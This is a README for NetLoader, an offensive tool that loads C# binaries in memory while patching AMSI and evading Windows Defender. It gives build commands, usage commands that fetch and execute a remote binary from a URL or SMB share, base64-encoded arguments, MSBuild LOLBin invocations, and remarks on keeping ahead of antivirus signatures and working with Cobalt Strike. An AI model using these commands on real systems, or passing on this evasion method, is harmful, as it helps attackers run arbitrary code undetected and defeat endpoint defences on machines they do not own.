# NetLoader
Loads any C# binary in mem, patching AMSI and bypassing Windows Defender

The binaries in this repo SHOULD be all clean and newly compiled from their respective GitHub repos, but feel free to compile / host your own.
(Don't consider running binaries from this repo good OPSEC) 

Latest update / Signature fix was 28.05.2020, pretty much clean as a whistle
Currently doing 24/7 signature checks, so let's see how long it takes this time

Code is designed to deploy binaries from a GitHub repo, so should be straight forward.

1. Clone your own repo from this
2. Change the url on line 13 in Program.cs
3. Re-Compile / add your own binaries in /Binaries (Regex looks for .bin only!)
3. Build and enjoy!

# Compile
Changed because Defender added some signatures related to VS ressources.
(Also just way simpler)

	c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:RandomName.exe Program.cs

# Usage
Deploy from remote URI

	PS D:\NetLoader> .\NetLoader.exe https://github.com/Flangvik/NetLoader/raw/master/Binaries/Stracciatella.bin whoami
	[!] ~Flangvik  #NetLoader
	[+] Patching...
	[+] Patched!
	[+] Starting https://github.com/Flangvik/NetLoader/raw/master/Binaries/Stracciatella.bin with args whoami
	desktop-oaa0hhf\flangvik


Deploy from local path or SMB share, note that NetLoader detects whether the input path is local or remote)

	.\NetLoader.exe --path D:\Tools\Stracciatella.bin --args whoami
	[!] ~Flangvik  #NetLoader
	[+] Patching...
	[+] Patched!
	[+] Starting D:\Tools\Stracciatella.bin with args whoami
	desktop-oaa0hhf\flangvik


Supports base64 inputs for those long strings that usually would break stuff!

	PS D:\NetLoader> .\NetLoader.exe b64 aHR0cHM6Ly9naXRodWIuY29tL0ZsYW5ndmlrL05ldExvYWRlci9yYXcvbWFzdGVyL0JpbmFyaWVzL1N0cmFjY2lhdGVsbGEuYmlu d2hvYW1p
	[!] ~Flangvik  #NetLoader
	[+] Patching...
	[+] Patched!
	[+] Starting https://github.com/Flangvik/NetLoader/raw/master/Binaries/Stracciatella.bin with args whoami
	desktop-oaa0hhf\flangvik
	PS D:\NetLoader>


	PS D:\NetLoader> .\NetLoader.exe --b64 --path aHR0cHM6Ly9naXRodWIuY29tL0ZsYW5ndmlrL05ldExvYWRlci9yYXcvbWFzdGVyL0JpbmFyaWVzL1N0cmFjY2lhdGVsbGEuYmlu --args d2hvYW1p
	[!] ~Flangvik  #NetLoader
	[+] Patching...
	[+] Patched!
	[+] Starting https://github.com/Flangvik/NetLoader/raw/master/Binaries/Stracciatella.bin with args whoami
	desktop-oaa0hhf\flangvik

Should be Cobalt Strike friendly ! :) 

Credits to https://twitter.com/_RastaMouse for the AMSI bypass
-> https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/master/ASBBypass/Program.cs

# LOLBins

Payload for MSBuild is in the repo (LOLBins) folder, might push this for varius other LOLBins aswell.

	For 64 bit:
	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe NetLoader.xml

	For 32 bit:
	C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe NetLoader.xml

# Todo
- [ ]  Automate the build and release of many of the Sharp Tools so they automagically appear in /Binaries (CDI / Azure DevOps)
- [X]  Add support for non-interactive use (input args)
- [X]  Add support to run custom modules from your own URL or SMB Share (Great for on-the-fly Implant deployment)
- [ ]  Add some missing stuff SharpSploit and SharpShell (Need to fix some deps)
- [ ]  Propely confirm and test every current bin
- [X]  Add an working MSBuild XML payload for the LOLBins lovers (Myself included)
- [ ]  Update with credits and links to the github repos that /Binaries are compiled from
